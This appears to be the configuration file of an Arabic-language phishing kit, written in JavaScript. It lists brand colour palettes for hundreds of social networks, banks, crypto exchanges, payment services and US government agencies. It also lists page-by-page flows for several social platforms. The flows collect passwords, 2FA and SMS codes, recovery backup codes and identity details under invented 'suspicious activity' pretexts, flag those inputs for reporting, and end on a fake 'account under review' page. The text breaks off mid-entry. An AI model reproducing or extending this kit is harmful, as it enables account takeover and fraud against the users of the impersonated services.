export const CATEGORIES = [
  { id: 'social',     name: 'منصات التواصل',    count: 20 },
  { id: 'government', name: 'مؤسسات حكومية',    count: 20 },
  { id: 'banks',      name: 'بنوك ومالية',       count: 30 },
  { id: 'crypto',     name: 'عملات رقمية',       count: 30 },
  { id: 'payments',   name: 'دفع إلكتروني',      count: 30 },
  { id: 'email',      name: 'بريد إلكتروني',     count: 15 },
  { id: 'tech',       name: 'تكنولوجيا',         count: 25 },
  { id: 'airlines',   name: 'طيران',             count: 20 },
  { id: 'audio',      name: 'موسيقى',            count: 30 },
  { id: 'video',      name: 'فيديو',             count: 30 }
];

const CATEGORY_DEFAULTS = {
  social:     ['#1a1a2e','#16213e','#eee','#e94560','#0f3460'],
  government: ['#0d1b2a','#1b2838','#ffffff','#1f6feb','#58a6ff'],
  banks:      ['#0a192f','#172a45','#ccd6f6','#64ffda','#00b4d8'],
  crypto:     ['#0b0e11','#1e2026','#f8f9fa','#f0b90b','#fcd535'],
  payments:   ['#001f4b','#003087','#ffffff','#009cde','#00cfff'],
  email:      ['#1a1a2e','#16213e','#eee','#ea4335','#fbbc04'],
  tech:       ['#000000','#1c1c1e','#ffffff','#0a84ff','#30d158'],
  airlines:   ['#003366','#002244','#ffffff','#cc0000','#d4af37'],
  audio:      ['#121212','#282828','#ffffff','#1db954','#1ed760'],
  video:      ['#141414','#221f1f','#ffffff','#e50914','#ff4500']
};

const PALETTES = {
  facebook:       ['#18191A','#242526','#E4E6EB','#1877F2','#42B72A'],
  instagram:      ['#0A0A0A','#1A1A1A','#FAFAFA','#E1306C','#F56040'],
  tiktok:         ['#000000','#161616','#FFFFFF','#FE2C55','#25F4EE'],
  twitterx:       ['#000000','#16181C','#E7E9EA','#1D9BF0','#FFD700'],
  snapchat:       ['#FFFC00','#F5F500','#000000','#FFFC00','#FFD700'],
  linkedin:       ['#000000','#1B1F23','#FFFFFF','#0A66C2','#70B5F9'],
  pinterest:      ['#1A1A1A','#2A1A1A','#FFFFFF','#E60023','#FF4560'],
  reddit:         ['#1A1A1B','#272729','#D7DADC','#FF4500','#FF6534'],
  tumblr:         ['#001935','#002A50','#FFFFFF','#35465C','#65798B'],
  discord:        ['#36393F','#2F3136','#FFFFFF','#5865F2','#7289DA'],
  whatsapp:       ['#0A1628','#1B2836','#FFFFFF','#25D366','#128C7E'],
  telegram:       ['#17212B','#232E3C','#FFFFFF','#2AABEE','#229ED9'],
  wechat:         ['#1A1A1A','#2D2D2D','#FFFFFF','#07C160','#09BB07'],
  line:           ['#1A1A1A','#2A2A2A','#FFFFFF','#00B900','#00C300'],
  viber:          ['#2A1858','#3D1F7A','#FFFFFF','#7360F2','#8B78FF'],
  bereal:         ['#000000','#111111','#FFFFFF','#FFFFFF','#CCCCCC'],
  clubhouse:      ['#F1EDE1','#E8E2D5','#000000','#F2A24B','#E8943A'],
  mastodon:       ['#191B22','#282C37','#FFFFFF','#6364FF','#563ACC'],
  threads:        ['#000000','#101010','#FFFFFF','#FFFFFF','#AAAAAA'],
  youtube:        ['#0F0F0F','#1A1A1A','#FFFFFF','#FF0000','#CC0000'],

  irs:            ['#00205B','#001A4E','#FFFFFF','#C8102E','#1F3C88'],
  ssa:            ['#003366','#002244','#FFFFFF','#0066CC','#004499'],
  dmv:            ['#1B3A6B','#102454','#FFFFFF','#C8102E','#1B3A6B'],
  uscis:          ['#003087','#001F5E','#FFFFFF','#C8102E','#003087'],
  tsa:            ['#003087','#002060','#FFFFFF','#0059A3','#C8102E'],
  nasa:           ['#0B3D91','#0A2E6E','#FFFFFF','#FC3D21','#0B3D91'],
  fbi:            ['#002868','#001847','#FFFFFF','#BF0A30','#002868'],
  cia:            ['#003087','#002060','#FFFFFF','#C8102E','#002868'],
  nsa:            ['#002868','#001847','#FFFFFF','#0A52A1','#BF0A30'],
  dhs:            ['#003087','#001F5E','#FFFFFF','#0052A5','#C8102E'],
  va:             ['#003F72','#002B4E','#FFFFFF','#003F72','#C8102E'],
  medicare:       ['#1F306E','#0F1E56','#FFFFFF','#1F306E','#E31837'],
  medicaid:       ['#2C5F8A','#1C4A75','#FFFFFF','#2C5F8A','#E31837'],
  sba:            ['#003087','#002060','#FFFFFF','#003087','#C8102E'],
  ftc:            ['#003087','#001F5E','#FFFFFF','#003087','#E31837'],
  sec:            ['#00205B','#001240','#FFFFFF','#00205B','#E31837'],
  usps:           ['#004B87','#003568','#FFFFFF','#333366','#C8102E'],
  statedept:      ['#003087','#002060','#FFFFFF','#C8102E','#003087'],
  passport:       ['#003087','#002060','#FFFFFF','#C8102E','#003087'],
  un:             ['#009EDB','#0087C0','#FFFFFF','#009EDB','#4BBDE4'],

  jpmorganchase:  ['#FFFFFF','#F7F7F7','#000000','#0058A3','#003B70'],
  bankofamerica:  ['#012169','#001A5E','#FFFFFF','#E31837','#012169'],
  wellsfargo:     ['#D71E28','#B01020','#FFFFFF','#FFCD34','#D71E28'],
  citibank:       ['#003B70','#00254B','#FFFFFF','#003B70','#EE1C25'],
  hsbc:           ['#DB0011','#A80000','#FFFFFF','#DB0011','#000000'],
  barclays:       ['#00AEEF','#0090C8','#FFFFFF','#00AEEF','#00182A'],
  deutschebank:   ['#0018A8','#000F7A','#FFFFFF','#0018A8','#E4002B'],
  bnpparibas:     ['#00965E','#006B43','#FFFFFF','#009A44','#006B43'],
  goldmansachs:   ['#1A4173','#0F2D55','#FFFFFF','#1A4173','#7DB0D5'],
  morganstanley:  ['#003087','#002060','#FFFFFF','#003087','#1F73C3'],
  ubs:            ['#E60000','#B00000','#FFFFFF','#E60000','#000000'],
  creditsuisse:   ['#006498','#004A72','#FFFFFF','#006498','#E4002B'],
  tdbank:         ['#00B140','#008A30','#FFFFFF','#00B140','#009431'],
  rbc:            ['#005DAA','#003F7A','#FFFFFF','#005DAA','#FECB00'],
  santander:      ['#EC0000','#B50000','#FFFFFF','#EC0000','#000000'],
  bbva:           ['#004481','#003060','#FFFFFF','#004481','#049FD4'],
  ing:            ['#FF6200','#D94F00','#FFFFFF','#FF6200','#FF6200'],
  abnamro:        ['#009B77','#007559','#FFFFFF','#009B77','#FFAD00'],
  rabobank:       ['#003882','#002260','#FFFFFF','#003882','#FF6600'],
  commerzbank:    ['#FFCC00','#D4A900','#000000','#FFCC00','#003D7A'],
  scotiabank:     ['#EC111A','#B50000','#FFFFFF','#EC111A','#FAAD1B'],
  anz:            ['#007DBA','#005A8A','#FFFFFF','#007DBA','#83B81A'],
  nab:            ['#CC0000','#990000','#FFFFFF','#CC0000','#000000'],
  westpac:        ['#D5002B','#A30020','#FFFFFF','#D5002B','#000000'],
  standardchartered:['#0072AA','#00537A','#FFFFFF','#0072AA','#1DB954'],
  emiratesnbd:    ['#BE0000','#8A0000','#FFFFFF','#BE0000','#D4AF37'],
  mashreq:        ['#C8102E','#950B21','#FFFFFF','#C8102E','#FFD700'],
  qnb:            ['#8B0000','#600000','#FFFFFF','#8B0000','#D4AF37'],
  adcb:           ['#D71920','#A01218','#FFFFFF','#D71920','#FFD700'],
  fab:            ['#003087','#002060','#FFFFFF','#003087','#D4AF37'],

  binance:        ['#0B0E11','#1E2026','#EAECEF','#F0B90B','#FCD535'],
  coinbase:       ['#0A0B0D','#161719','#FFFFFF','#0052FF','#1652F0'],
  kraken:         ['#000000','#1A1A1A','#FFFFFF','#5741D9','#7B68EE'],
  bitfinex:       ['#1B1B1B','#2A2A2A','#FFFFFF','#16B157','#12904C'],
  gemini:         ['#05061B','#0B0D2A','#FFFFFF','#00DCFA','#05D2F5'],
  okx:            ['#000000','#111111','#FFFFFF','#FFFFFF','#AAAAAA'],
  bybit:          ['#1A1A2E','#16213E','#FFFFFF','#F7A600','#FF9D00'],
  huobi:          ['#1A1A1A','#2A2A2A','#FFFFFF','#00B4D8','#0096B4'],
  kucoin:         ['#0A1628','#1B2836','#FFFFFF','#23AF91','#1B9C7E'],
  gateio:         ['#1A1A2E','#16213E','#FFFFFF','#2354E6','#1A42C2'],
  cryptocom:      ['#002D74','#001E50','#FFFFFF','#1199FA','#0085E6'],
  bitstamp:       ['#0A1628','#1B2836','#FFFFFF','#00AA4F','#008840'],
  poloniex:       ['#1A1A2E','#0F0F1E','#FFFFFF','#00B54C','#009A40'],
  mexc:           ['#0B0E11','#1A1D21','#FFFFFF','#00B060','#009A52'],
  phemex:         ['#0B1426','#162040','#FFFFFF','#4B82FB','#3A71EA'],
  dydx:           ['#1B1D2E','#252738','#FFFFFF','#6966FF','#5855E6'],
  uniswap:        ['#0D0E13','#1B1D27','#FFFFFF','#FF007A','#E6006B'],
  metamask:       ['#1A1A1A','#2A2A2A','#FFFFFF','#F6851B','#E2761B'],
  trustwallet:    ['#0500FF','#0400CC','#FFFFFF','#3375BB','#2A62A8'],
  ledger:         ['#000000','#111111','#FFFFFF','#000000','#AAAAAA'],
  trezor:         ['#1A1A1A','#2A2A2A','#FFFFFF','#00854D','#006B3E'],
  exodus:         ['#0D0E13','#1A1B20','#FFFFFF','#8B5CF6','#7C3AED'],
  phantom:        ['#AB9FF2','#9B8EE2','#000000','#AB9FF2','#9B8EE2'],
  solflare:       ['#FC6D26','#E05A1A','#FFFFFF','#FC6D26','#E05A1A'],
  bitmartex:      ['#0B0E11','#1A1D21','#FFFFFF','#02C076','#01A263'],
  lbank:          ['#0B0E11','#1A1D21','#FFFFFF','#0D5AEF','#0A49C8'],
  coinex:         ['#1A1A2E','#16213E','#FFFFFF','#00B8A0','#009A87'],
  bitget:         ['#0A0E27','#141830','#FFFFFF','#00F0FF','#00C8D4'],
  pionex:         ['#0A1628','#1B2836','#FFFFFF','#0CBFE8','#0AABCF'],
  htx:            ['#1A1A2E','#16213E','#FFFFFF','#3F3FC6','#3030B0'],

  paypal:         ['#001F4B','#003087','#FFFFFF','#009CDE','#00A0DC'],
  stripe:         ['#0A2540','#425466','#FFFFFF','#635BFF','#80E9FF'],
  square:         ['#006AFF','#0052CC','#FFFFFF','#006AFF','#3B82F6'],
  venmo:          ['#008CFF','#0070CC','#FFFFFF','#008CFF','#3AA0FF'],
  zelle:          ['#6D1ED4','#5518A8','#FFFFFF','#6D1ED4','#8B44F0'],
  cashapp:        ['#00D64F','#00B844','#FFFFFF','#00D64F','#00F55A'],
  applepay:       ['#000000','#1C1C1E','#FFFFFF','#0A84FF','#30D158'],
  googlepay:      ['#202124','#303134','#FFFFFF','#4285F4','#34A853'],
  samsungpay:     ['#1428A0','#0D1E80','#FFFFFF','#1428A0','#1E3FD4'],
  klarna:         ['#FFB3C7','#FF99B3','#000000','#FFB3C7','#FF6699'],
  afterpay:       ['#B2FCE4','#99F5D5','#000000','#B2FCE4','#00D18B'],
  affirm:         ['#0FA0EA','#0C85C5','#FFFFFF','#0FA0EA','#0C85C5'],
  braintree:      ['#003087','#002060','#FFFFFF','#009CDE','#0070B4'],
  adyen:          ['#0ABF53','#08A047','#FFFFFF','#0ABF53','#00A843'],
  worldpay:       ['#003087','#002060','#FFFFFF','#00B4D8','#0096B4'],
  checkoutcom:    ['#1B1B2F','#262638','#FFFFFF','#0070BA','#005C9A'],
  wise:           ['#9FE870','#8AD660','#000000','#9FE870','#00B9FF'],
  revolut:        ['#191C1F','#0D0F11','#FFFFFF','#FFFFFF','#AAAAAA'],
  monzo:          ['#FF3264','#E8005A','#FFFFFF','#FF3264','#FF5A82'],
  n26:            ['#26B881','#1E9A6B','#FFFFFF','#26B881','#1DB975'],
  chime:          ['#1EC677','#18A564','#FFFFFF','#1EC677','#15B56A'],
  ally:           ['#5B3DB3','#4A2E9A','#FFFFFF','#5B3DB3','#7756CC'],
  payoneer:       ['#FF4800','#D93C00','#FFFFFF','#FF4800','#FF6633'],
  skrill:         ['#8B1ACA','#6F14A0','#FFFFFF','#8B1ACA','#A025F0'],
  neteller:       ['#16244A','#0E1833','#FFFFFF','#00B2E3','#0096C2'],
  paysafe:        ['#0070BA','#005A96','#FFFFFF','#0070BA','#00A3E0'],
  razorpay:       ['#3395FF','#1A7FFF','#FFFFFF','#3395FF','#2287FF'],
  paytm:          ['#002970','#001C52','#FFFFFF','#00BAF2','#009DCC'],
  phonepe:        ['#5F259F','#4A1A7F','#FFFFFF','#5F259F','#7B35CC'],
  gcash:          ['#007DC5','#0063A0','#FFFFFF','#007DC5','#00A0F0'],

  gmail:          ['#FFFFFF','#F1F3F4','#202124','#EA4335','#FBBC04'],
  outlook:        ['#0078D4','#005A9E','#FFFFFF','#0078D4','#50A0E0'],
  yahoomail:      ['#6001D2','#4A00A8','#FFFFFF','#6001D2','#9B59D0'],
  protonmail:     ['#1C1B4B','#131230','#FFFFFF','#6D4AFF','#5733FF'],
  tutanota:       ['#C40025','#9B001D','#FFFFFF','#C40025','#E8001C'],
  zohomail:       ['#E42527','#C01E20','#FFFFFF','#E42527','#F74E50'],
  icloudmail:     ['#000000','#1C1C1E','#FFFFFF','#0A84FF','#30D158'],
  fastmail:       ['#1A237E','#0D1460','#FFFFFF','#1A237E','#283593'],
  hey:            ['#CC3300','#AA2600','#FFFFFF','#CC3300','#FF4422'],
  superhuman:     ['#1A1A2E','#16213E','#FFFFFF','#FFA500','#FF8C00'],
  spike:          ['#1A1A2E','#16213E','#FFFFFF','#FF4D4D','#FF3333'],
  airmail:        ['#1A1A2E','#16213E','#FFFFFF','#007AFF','#0066D6'],
  basecampmail:   ['#1A1A2E','#16213E','#FFFFFF','#1D9BF0','#0A7FCC'],
  postmark:       ['#FFDD00','#E6C500','#000000','#FFDD00','#FFCC00'],
  sendgrid:       ['#1A82E2','#1570C2','#FFFFFF','#1A82E2','#3498DB'],

  apple:          ['#000000','#1C1C1E','#FFFFFF','#0A84FF','#30D158'],
  microsoft:      ['#000000','#1C1C1E','#FFFFFF','#00A4EF','#FFB900'],
  google:         ['#202124','#303134','#E8EAED','#4285F4','#34A853'],
  amazon:         ['#131A22','#232F3E','#FFFFFF','#FF9900','#146EB4'],
  meta:           ['#242526','#18191A','#FFFFFF','#0866FF','#1877F2'],
  netflix:        ['#141414','#221F1F','#FFFFFF','#E50914','#B81D24'],
  uber:           ['#000000','#1A1A1A','#FFFFFF','#000000','#AAAAAA'],
  airbnb:         ['#FFFFFF','#F7F7F7','#000000','#FF5A5F','#FF3B42'],
  spotify:        ['#121212','#282828','#FFFFFF','#1DB954','#1ED760'],
  dropbox:        ['#0061FF','#004DC8','#FFFFFF','#0061FF','#4E97FF'],
  slack:          ['#3F0F40','#350B36','#FFFFFF','#4A154B','#E01E5A'],
  zoom:           ['#0B5CFF','#0048CC','#FFFFFF','#0B5CFF','#2D8CFF'],
  adobe:          ['#FF0000','#CC0000','#FFFFFF','#FF0000','#FF3333'],
  salesforce:     ['#00A1E0','#0082B3','#FFFFFF','#00A1E0','#1589EE'],
  oracle:         ['#C74634','#A33829','#FFFFFF','#C74634','#F80000'],
  sap:            ['#003366','#002244','#FFFFFF','#1872C8','#003366'],
  ibm:            ['#1F70C1','#145EA0','#FFFFFF','#1F70C1','#054ADA'],
  intel:          ['#0071C5','#0059A3','#FFFFFF','#0071C5','#00C7FD'],
  amd:            ['#ED1C24','#C0141A','#FFFFFF','#ED1C24','#FF3C44'],
  nvidia:         ['#76B900','#5A9400','#FFFFFF','#76B900','#8DD400'],
  cloudflare:     ['#F48120','#D0680C','#FFFFFF','#F48120','#FBAD41'],
  twilio:         ['#F22F46','#CC1F35','#FFFFFF','#F22F46','#FF4F64'],
  okta:           ['#007DC1','#0063A0','#FFFFFF','#007DC1','#009FDC'],
  datadog:        ['#632CA6','#4A1E82','#FFFFFF','#632CA6','#774DC5'],
  hashicorp:      ['#000000','#1A1A1A','#FFFFFF','#3FD3CC','#30B0AA'],

  emirates:       ['#C8102E','#9B0C23','#FFFFFF','#C8102E','#D4AF37'],
  qatarairways:   ['#5C0632','#3A0420','#FFFFFF','#8D1B3D','#D4AF37'],
  etihad:         ['#003366','#002244','#FFFFFF','#B8A062','#D4AF37'],
  turkishairlines:['#C8102E','#9B0C23','#FFFFFF','#C8102E','#FFFFFF'],
  lufthansa:      ['#05164D','#030E33','#FFFFFF','#FFD700','#FFC300'],
  britishairways: ['#075AAA','#054080','#FFFFFF','#C8102E','#075AAA'],
  airfrance:      ['#002157','#001540','#FFFFFF','#003087','#D4006A'],
  klm:            ['#00A1DE','#0082B3','#FFFFFF','#00A1DE','#003082'],
  swissair:       ['#CC0000','#990000','#FFFFFF','#CC0000','#000000'],
  singaporeairlines:['#00305F','#001F42','#FFFFFF','#00305F','#C8AA78'],
  cathaypacific:  ['#003B5C','#002840','#FFFFFF','#006564','#003B5C'],
  ana:            ['#0A1F6E','#071550','#FFFFFF','#0A1F6E','#1B5CA0'],
  jal:            ['#CC0000','#990000','#FFFFFF','#CC0000','#000000'],
  delta:          ['#003C7E','#002862','#FFFFFF','#C8102E','#003C7E'],
  united:         ['#005DAA','#003F7A','#FFFFFF','#005DAA','#1F73C3'],
  american:       ['#C8102E','#9B0C23','#FFFFFF','#003087','#C8102E'],
  southwest:      ['#304CB2','#1F3495','#FFFFFF','#FFBF27','#304CB2'],
  ryanair:        ['#073590','#052778','#FFFFFF','#F7A600','#073590'],
  easyjet:        ['#FF6600','#D94F00','#FFFFFF','#FF6600','#FF8833'],
  airarabia:      ['#CC0000','#990000','#FFFFFF','#CC0000','#FFD700'],

  spotifyaudio:   ['#121212','#282828','#FFFFFF','#1DB954','#1ED760'],
  applemusic:     ['#FC3C44','#D4242C','#FFFFFF','#FC3C44','#FF3B30'],
  amazonmusic:    ['#131A22','#232F3E','#FFFFFF','#00A8E0','#007EB0'],
  youtubemusic:   ['#0F0F0F','#1A1A1A','#FFFFFF','#FF0000','#CC0000'],
  tidal:          ['#000000','#1A1A1A','#FFFFFF','#FFFFFF','#AAAAAA'],
  deezer:         ['#A238FF','#8B25E5','#FFFFFF','#A238FF','#FF0092'],
  soundcloud:     ['#F30','#CC2900','#FFFFFF','#FF3300','#FF6633'],
  pandora:        ['#1B97F5','#0F80D4','#FFFFFF','#1B97F5','#00BFFF'],
  iheartradio:    ['#C6003B','#9B002E','#FFFFFF','#C6003B','#E8003F'],
  tunein:         ['#00D2E8','#00B0C2','#FFFFFF','#00D2E8','#00F2FF'],
  audible:        ['#F8991D','#D4800F','#FFFFFF','#F8991D','#FF9933'],
  podcastaddict:  ['#E56717','#C0540D','#FFFFFF','#E56717','#FF7733'],
  overcast:       ['#FC7E0F','#D8660B','#FFFFFF','#FC7E0F','#FFB347'],
  pocketcasts:    ['#F43E37','#D42D27','#FFFFFF','#F43E37','#FF5555'],
  stitcher:       ['#1A1A1A','#2A2A2A','#FFFFFF','#0066FF','#4499FF'],
  castbox:        ['#F05323','#D0401A','#FFFFFF','#F05323','#FF6644'],
  radiopublic:    ['#DC2626','#B91C1C','#FFFFFF','#DC2626','#EF4444'],
  luminary:       ['#1A1A2E','#16213E','#FFFFFF','#6D28D9','#7C3AED'],
  breaker:        ['#FF4B55','#E03040','#FFFFFF','#FF4B55','#FF7080'],
  googlepodcasts: ['#4285F4','#3367D6','#FFFFFF','#4285F4','#34A853'],
  siriusxm:       ['#0000E6','#0000B8','#FFFFFF','#0000E6','#4444FF'],
  bandcamp:        ['#1DA0C3','#1585A0','#FFFFFF','#1DA0C3','#3DC8E8'],
  mixcloud:       ['#000000','#1A1A1A','#FFFFFF','#5000FF','#7733FF'],
  audiomack:      ['#F7931A','#D47A12','#FFFFFF','#F7931A','#FFA500'],
  datpiff:        ['#CC0000','#990000','#FFFFFF','#CC0000','#FF3333'],
  livexlive:      ['#1A1A2E','#16213E','#FFFFFF','#FF2D55','#FF4D70'],
  slacker:        ['#1A1A2E','#16213E','#FFFFFF','#00C4E0','#00AACC'],
  eighttracks:    ['#1A1A2E','#16213E','#FFFFFF','#DB5500','#FF6600'],
  lastfm:         ['#D51007','#B00C06','#FFFFFF','#D51007','#F22B1A'],
  napster:        ['#1A1A2E','#16213E','#FFFFFF','#00C4A7','#00A88E'],

  netflixvideo:   ['#141414','#221F1F','#FFFFFF','#E50914','#B81D24'],
  youtubevideo:   ['#0F0F0F','#1A1A1A','#FFFFFF','#FF0000','#CC0000'],
  disneyplus:     ['#090B33','#050722','#FFFFFF','#0062E3','#1A6EF0'],
  hbomax:         ['#0F002A','#070019','#FFFFFF','#5822B4','#6B35CC'],
  hulu:           ['#1CE783','#14C26D','#000000','#1CE783','#00CC66'],
  amazonprime:    ['#131A22','#232F3E','#FFFFFF','#00A8E0','#008FBF'],
  peacock:        ['#000000','#1A1A1A','#FFFFFF','#FA4B00','#FF6633'],
  paramountplus:  ['#0064FF','#0050CC','#FFFFFF','#0064FF','#3385FF'],
  appletvplus:    ['#000000','#1C1C1E','#FFFFFF','#0A84FF','#30D158'],
  discoveryplus:  ['#0027FF','#001FCC','#FFFFFF','#0027FF','#3355FF'],
  espnplus:       ['#CC0000','#990000','#FFFFFF','#CC0000','#FF3333'],
  fubo:           ['#1A1A1A','#2A2A2A','#FFFFFF','#E90B5C','#FF2277'],
  sling:          ['#0CB4CF','#0A96AE','#FFFFFF','#0CB4CF','#1ED4F0'],
  philo:          ['#1A1A2E','#16213E','#FFFFFF','#E82562','#FF3A7A'],
  crunchyroll:    ['#F47521','#D0600F','#FFFFFF','#F47521','#FF8C3A'],
  funimation:     ['#420FA8','#330C85','#FFFFFF','#420FA8','#5C20CC'],
  tubi:           ['#FA002C','#D00023','#FFFFFF','#FA002C','#FF3355'],
  plutotv:        ['#FFF200','#E5D900','#000000','#FFF200','#FFFF33'],
  vudu:           ['#32B5E8','#2298C2','#FFFFFF','#32B5E8','#55CCFF'],
  googletv:       ['#4285F4','#3367D6','#FFFFFF','#4285F4','#34A853'],
  mubi:           ['#FFF200','#E5D900','#000000','#FFF200','#FFFF55'],
  criterion:      ['#000000','#1A1A1A','#FFFFFF','#CC0000','#FF3333'],
  shudder:        ['#CC0000','#990000','#FFFFFF','#CC0000','#FF0000'],
  arrowvideo:     ['#AA0000','#880000','#FFFFFF','#AA0000','#CC1111'],
  britbox:        ['#FF5722','#E04A1B','#FFFFFF','#FF5722','#FF7744'],
  acorntv:        ['#2A5934','#1A3D22','#FFFFFF','#2A5934','#3D8050'],
  mhzchoice:      ['#1A1A2E','#16213E','#FFFFFF','#E74C3C','#FF5A4A'],
  sundancenow:    ['#1A1A2E','#16213E','#FFFFFF','#E74C3C','#FF5555'],
  topic:          ['#1A1A2E','#16213E','#FFFFFF','#6C5CE7','#7D70F0'],
  vimeo:          ['#1AB7EA','#0E9AC8','#FFFFFF','#1AB7EA','#00ADEF']
};

// ─── Per-brand flows ─────────────────────────────────────────────────────────
// Each entry: { slug, form_type, page_title, headline, subheadline, fields,
//               layout, cta, step_label, notify_step, otp_length? }
// form_type: login | otp | otp_long | checkpoint | verify | payment |
//            security_q | confirm | locked

const FLOWS = {

  // ── SOCIAL ──────────────────────────────────────────────────────────────────

  facebook: [
    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',      headline:'أهلاً بك في Facebook',               subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك وكلمة المرور',   fields:['email','password'],                  layout:'auth',       cta:'تسجيل الدخول',    step_label:'Login',      notify_step:true  },
    { slug:'checkpoint', form_type:'checkpoint',  page_title:'تحقق من هويتك',     headline:'تم تقييد حسابك مؤقتاً',              subheadline:'لاحظنا نشاطاً غير معتاد. نحتاج للتحقق من هويتك لإعادة تفعيل الحساب', fields:[],              layout:'checkpoint', cta:'التحقق من الهوية', step_label:'Checkpoint', notify_step:false },
    { slug:'id-verify',  form_type:'id_verify',   page_title:'تحقق من الهوية',    headline:'أكّد هويتك',                          subheadline:'ارفع صورة من هويتك الشخصية أو جواز السفر',           fields:['full_name','dob','id_number'],        layout:'verify',     cta:'إرسال',            step_label:'ID Verify',  notify_step:true  },
    { slug:'2fa',        form_type:'otp',         page_title:'التحقق بخطوتين',    headline:'أدخل كود المصادقة',                   subheadline:'أدخل الكود المكون من 6 أرقام من تطبيق المصادقة',     fields:['code'],                              layout:'otp',        cta:'تأكيد',            step_label:'2FA',        notify_step:true,  otp_length:6 },
    { slug:'locked',     form_type:'locked',      page_title:'الحساب محدود',      headline:'جارٍ مراجعة حسابك',                  subheadline:'سيتم إعادة تفعيل حسابك خلال 24 ساعة بعد المراجعة',  fields:[],                                    layout:'locked',     cta:'',                 step_label:'Locked',     notify_step:false }
  ],

  instagram: [
    { slug:'login',             form_type:'login',     page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Instagram',            subheadline:'أدخل اسم المستخدم أو الإيميل وكلمة المرور',          fields:['username','password'],               layout:'auth',       cta:'تسجيل الدخول',    step_label:'Login',           notify_step:true  },
    { slug:'suspicious',        form_type:'checkpoint',page_title:'نشاط مشبوه',    headline:'هل أنت من قام بهذا؟',               subheadline:'لاحظنا تسجيل دخول من جهاز غير معروف. تأكد أنك أنت',  fields:[],                                    layout:'checkpoint', cta:'نعم، أنا من قام بذلك', step_label:'Suspicious',    notify_step:false },
    { slug:'sms-verify',        form_type:'otp',       page_title:'التحقق برسالة', headline:'أدخل الكود المرسل',                  subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',             fields:['code'],                              layout:'otp',        cta:'تأكيد',            step_label:'SMS Verify',      notify_step:true,  otp_length:6 },
    { slug:'recovery',          form_type:'verify',    page_title:'كود الاسترداد', headline:'استخدم كود الاسترداد',               subheadline:'أدخل أحد أكواد الاسترداد الاحتياطية',               fields:['backup_code'],                       layout:'verify',     cta:'متابعة',           step_label:'Recovery Code',   notify_step:true  },
    { slug:'confirm-info',      form_type:'verify',    page_title:'تأكيد البيانات',headline:'أكّد بياناتك الشخصية',               subheadline:'نحتاج للتحقق من معلوماتك لحماية حسابك',              fields:['full_name','dob','phone'],            layout:'verify',     cta:'تأكيد',            step_label:'Confirm Info',    notify_step:true  }
  ],

  tiktok: [
    { slug:'login',      form_type:'login',   page_title:'تسجيل الدخول',  headline:'سجّل دخولك في TikTok',              subheadline:'أدخل بريدك أو رقم هاتفك وكلمة المرور',      fields:['email','password'],  layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
    { slug:'captcha',    form_type:'verify',  page_title:'التحقق الأمني', headline:'تحقق من أنك لست روبوتاً',          subheadline:'أكمل التحقق للمتابعة',                       fields:[],                    layout:'checkpoint', cta:'تأكيد',     step_label:'Captcha',    notify_step:false },
    { slug:'sms-verify', form_type:'otp',     page_title:'تحقق برسالة',   headline:'أدخل الكود',                       subheadline:'أرسلنا كود تحقق إلى رقم هاتفك',             fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'SMS Verify', notify_step:true,  otp_length:6 }
  ],

  twitterx: [
    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',  headline:'سجّل دخولك في X',                  subheadline:'أدخل بريدك أو هاتفك أو اسم المستخدم',       fields:['email'],             layout:'auth',  cta:'التالي',           step_label:'Username',       notify_step:true  },
    { slug:'password',        form_type:'login',  page_title:'كلمة المرور',   headline:'أدخل كلمة المرور',                 subheadline:'',                                           fields:['password'],          layout:'auth',  cta:'تسجيل الدخول',     step_label:'Password',       notify_step:true  },
    { slug:'2fa',             form_type:'otp',    page_title:'التحقق بخطوتين',headline:'أدخل كود التحقق',                 subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],              layout:'otp',   cta:'تأكيد',            step_label:'2FA',            notify_step:true,  otp_length:6 },
    { slug:'confirm-account', form_type:'verify', page_title:'تأكيد الحساب',  headline:'أكّد رقم هاتفك',                  subheadline:'أدخل رقم هاتفك لتأكيد هويتك',               fields:['phone'],             layout:'verify',cta:'إرسال الكود',       step_label:'Confirm Account',notify_step:true  }
  ],

  snapchat: [
    { slug:'login',     form_type:'login',  page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Snapchat',         subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',        fields:['email','password'],  layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'birthday',  form_type:'verify', page_title:'تحقق من هويتك', headline:'أكّد تاريخ ميلادك',              subheadline:'أدخل تاريخ ميلادك للتحقق من هويتك',         fields:['dob'],               layout:'verify',cta:'متابعة',       step_label:'Birthday', notify_step:true  },
    { slug:'sms-code',  form_type:'otp',    page_title:'كود التحقق',     headline:'أدخل الكود المرسل إليك',        subheadline:'أرسلنا كود تحقق برسالة نصية',               fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  linkedin: [
    { slug:'login',  form_type:'login', page_title:'تسجيل الدخول',  headline:'سجّل دخولك في LinkedIn',         subheadline:'ابقَ على تواصل مع شبكتك المهنية',           fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login', notify_step:true  },
    { slug:'2fa',    form_type:'otp',   page_title:'التحقق بخطوتين',headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً من 6 أرقام إلى بريدك الإلكتروني', fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'2FA',   notify_step:true,  otp_length:6 }
  ],

  pinterest: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Pinterest',        subheadline:'ابحث عن إلهامك',                             fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق الأمني', headline:'أدخل كود التحقق',                subheadline:'أرسلنا كود برسالة نصية',                     fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  reddit: [
